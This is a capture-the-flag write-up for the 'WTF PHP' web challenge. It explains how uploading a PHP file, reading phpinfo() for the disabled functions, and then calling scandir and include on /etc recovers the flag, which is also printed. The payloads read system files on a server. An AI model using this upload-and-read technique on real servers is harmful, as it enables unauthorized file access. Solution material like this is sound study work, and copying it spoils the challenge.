WTF PHP
===
**Category**: Web

**Points**: 269 (254 solves)

**Author**: Karma
### Description
```
Your php function didnt work? maybe some info will help you xD 
PS: Flag is somewhere in /etc
Note: This chall does not require any brute forcing
```
- Site: `http://wtf-php.darkarmy.xyz/`
### Solution
- Upload file .php with file content `phpinfo()`. I can see disable function `exited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,link,symlink,syslog,ld,mail,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,highlight_file,file,fopen,fread,var_dump,readfile`
- But i can use `print_r, scandir, file_get_contents,include ...`.
### Payload
- List files and directories inside the specified path `print_r(scandir("/etc/"));`
- Cat flag `include "/etc/f1@g.txt";`
### Flag
- `darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}`
